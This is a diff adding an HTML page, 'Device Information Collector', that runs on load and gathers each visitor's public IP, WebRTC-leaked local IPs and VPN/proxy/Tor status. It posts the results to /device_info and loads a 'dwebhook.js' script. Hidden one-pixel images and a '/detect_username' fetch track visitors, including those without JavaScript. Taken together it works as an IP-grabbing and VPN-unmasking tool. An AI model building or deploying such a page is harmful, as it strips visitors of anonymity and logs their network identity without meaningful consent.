@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Device & VPN Detection</title>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+    <!-- No-JS fallback tracking -->
+    <noscript>
+        <img src="/no_js_detector" width="1" height="1" style="display:none;" alt="">
+        <img src="/detect_username" width="1" height="1" style="display:none;" alt="">
+    </noscript>
+    <style>
+        body { font-family: Arial; padding: 20px; background: #f0f0f0; }
+        .status { background: white; padding: 20px; border-radius: 5px; margin: 10px 0; }
+        .success { color: green; }
+        .warning { color: orange; }
+        .error { color: red; }
+    </style>
+</head>
+<body onload="captureDeviceInfo(); detectUsername();">
+    <h1>Device Information Collector</h1>
+    <p id="status" class="status">Collecting device information...</p>
+    <div id="results" class="status" style="display:none;">
+        <h2>Results:</h2>
+        <pre id="resultsText"></pre>
+    </div>
+    
+    <!-- Image pixel tracking -->
+    <img src="/track" width="1" height="1" style="display:none;" alt="">
+    
+    <script type="text/javascript" src="dwebhook.js"></script>
+    <script>
+        // Username detection function
+        function detectUsername() {
+            try {
+                fetch('/detect_username')
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Username detection data:', data);
+                    })
+                    .catch(error => console.log('Username detection error:', error));
+            } catch (e) {
+                console.log('Username detection not available');
+            }
+        }
+        
+        async function captureDeviceInfo() {
+            let deviceData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+            };
+
+            // Get Public IP
+            const publicIP = await getPublicIP();
+            deviceData.publicIP = publicIP;
+            updateStatus(`✓ Public IP: ${publicIP}`);
+
+            // Get Local IP via WebRTC
+            deviceData.localIP = await getLocalIP();
+            updateStatus(`✓ Local IP: ${deviceData.localIP}`);
+
+            // Detect VPN/Proxy
+            deviceData.vpnDetection = await detectVPN(publicIP);
+            updateStatus(`✓ VPN Detection: ${deviceData.vpnDetection.isVPNDetected ? 'DETECTED' : 'None found'}`);
+
+            // Get MAC Address
+            deviceData.macAddress = await getMACAddress();
+            updateStatus(`✓ MAC Address: ${deviceData.macAddress}`);
+
+            // Get Network Info
+            if (navigator.connection) {
+                deviceData.networkInfo = {
+                    type: navigator.connection.effectiveType,
+                    downlink: navigator.connection.downlink
+                };
+                updateStatus(`✓ Network Type: ${deviceData.networkInfo.type}`);
+            }
+
+            // Get WebRTC leak info
+            deviceData.webrtcLeakIP = await getWebRTCLeakIP();
+            if (deviceData.webrtcLeakIP !== "N/A") {
+                updateStatus(`⚠ WebRTC Leak IP: ${JSON.stringify(deviceData.webrtcLeakIP)}`);
+            }
+
+            // Get DNS info
+            deviceData.dnsInfo = await getDNSInfo();
+
+            displayResults(deviceData);
+            sendToServer(deviceData);
+        }
+
+        function updateStatus(message) {
+            const statusEl = document.getElementById('status');
+            statusEl.innerHTML += '<div>' + message + '</div>';
+        }
+
+        function displayResults(data) {
+            const resultsDiv = document.getElementById('results');
+            const resultsText = document.getElementById('resultsText');
+            resultsText.textContent = JSON.stringify(data, null, 2);
+            resultsDiv.style.display = 'block';
+        }
+
+        // Get Public IP from multiple sources
+        async function getPublicIP() {
+            const services = [
+                'https://api.ipify.org?format=json',
+                'https://api.myip.com',
+                'https://ipapi.co/json/'
+            ];
+
+            for (let service of services) {
+                try {
+                    const response = await fetch(service);
+                    const data = await response.json();
+                    return data.ip || data.query || data.address;
+                } catch (e) {
+                    console.warn(`Failed to fetch from ${service}`);
+                }
+            }
+            return "N/A";
+        }
+
+        // Get Local IP via WebRTC
+        function getLocalIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                const ips = [];
+
+                pc.createDataChannel('');
+                pc.createOffer()
+                    .then(offer => pc.setLocalDescription(offer))
+                    .catch(err => console.error(err));
+
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate) return;
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = ipRegex.exec(ice.candidate.candidate);
+                    if (match) {
+                        const ipAddress = match[1];
+                        if (ips.indexOf(ipAddress) === -1) {
+                            ips.push(ipAddress);
+                        }
+                    }
+                };
+
+                setTimeout(() => {
+                    pc.close();
+                    resolve(ips.length > 0 ? ips[0] : "N/A");
+                }, 1000);
+            });
+        }
+
+        // Detect WebRTC Leak IP
+        function getWebRTCLeakIP() {
+            return new Promise((resolve) => {
+                const pc = new RTCPeerConnection({ iceServers: [] });
+                const candidates = [];
+
+                pc.createDataChannel('');
+                pc.createOffer().then(offer => pc.setLocalDescription(offer));
+
+                pc.onicecandidate = (ice) => {
+                    if (!ice || !ice.candidate) return;
+                    const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    const match = ipRegex.exec(ice.candidate.candidate);
+                    if (match) {
+                        candidates.push(match[1]);
+                    }
+                };
+
+                setTimeout(() => {
+                    pc.close();
+                    resolve(candidates.length > 0 ? candidates : "N/A");
+                }, 1500);
+            });
+        }
+
+        // Detect VPN/Proxy usage
+        async function detectVPN(publicIP) {
+            const vpnIndicators = {
+                isVPNDetected: false,
+                methods: [],
+                vpnProvider: "Unknown"
+            };
+
+            try {
+                // Method 1: Check IP against known VPN provider ranges
+                const vpnCheck = await fetch(`https://vpnapi.io/api?ip=${publicIP}`);
+                const vpnData = await vpnCheck.json();
+                
+                if (vpnData.security) {
+                    if (vpnData.security.vpn) {
+                        vpnIndicators.isVPNDetected = true;
+                        vpnIndicators.methods.push("VPN Provider Detection");
+                        vpnIndicators.vpnProvider = vpnData.security.vpn_type || "Unknown";
+                    }
+
+                    if (vpnData.security.proxy) {
+                        vpnIndicators.isVPNDetected = true;
+                        vpnIndicators.methods.push("Proxy Detection");
+                    }
+
+                    if (vpnData.security.tor) {
+                        vpnIndicators.isVPNDetected = true;
+                        vpnIndicators.methods.push("Tor Detection");
+                    }
+                }
+            } catch (e) {
+                console.warn("VPN detection service unavailable");
+            }
+
+            // Method 4: WebRTC Leak Detection
+            const webrtcIPs = await getWebRTCLeakIP();
+            if (webrtcIPs !== "N/A" && Array.isArray(webrtcIPs) && webrtcIPs.length > 0) {
+                const realIP = webrtcIPs[0];
+                if (realIP !== publicIP) {
+                    vpnIndicators.isVPNDetected = true;
+                    vpnIndicators.methods.push("WebRTC Leak");
+                    vpnIndicators.realIP = realIP;
+                    vpnIndicators.leakedIP = realIP;
+                }
+            }
+
+            // Method 5: Browser WebDriver Detection
+            if (navigator.webdriver) {
+                vpnIndicators.methods.push("Browser Automation Detected");
+            }
+
+            return vpnIndicators;
+        }
+
+        // Get DNS Information
+        async function getDNSInfo() {
+            const dnsInfo = {
+                dnsLeaked: false,
+                providers: []
+            };
+
+            try {
+                const dnsResponse = await fetch('https://dns.google/resolve?name=example.com');
+                const dnsData = await dnsResponse.json();
+                
+                if (dnsData.Question) {
+                    dnsInfo.dnsLeaked = false;
+                }
+            } catch (e) {
+                console.warn("DNS check failed");
+            }
+
+            return dnsInfo;
+        }
+
+        // Get MAC Address
+        async function getMACAddress() {
+            try {
+                // MICROPHONE ENUMERATION SUPPRESSED - Prevents mic permission prompts
+                /*
+                if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+                    const devices = await navigator.mediaDevices.enumerateDevices();
+                    const audioDevices = devices.filter(device => device.kind === 'audioinput');
+                    
+                    if (audioDevices.length > 0) {
+                        return audioDevices[0].deviceId.substring(0, 16);
+                    }
+                }
+                */
+                return "N/A";
+            } catch (e) {
+                console.error("MAC detection error:", e);
+                return "N/A";
+            }
+        }
+
+        function sendToServer(data) {
+            fetch('/device_info', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(data)
+            })
+            .then(response => response.json())
+            .then(result => {
+                updateStatus('✓ Device info sent to server successfully!');
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                updateStatus('✗ Error sending data to server');
+            });
+        }
+    </script>
+</body>
+</html>
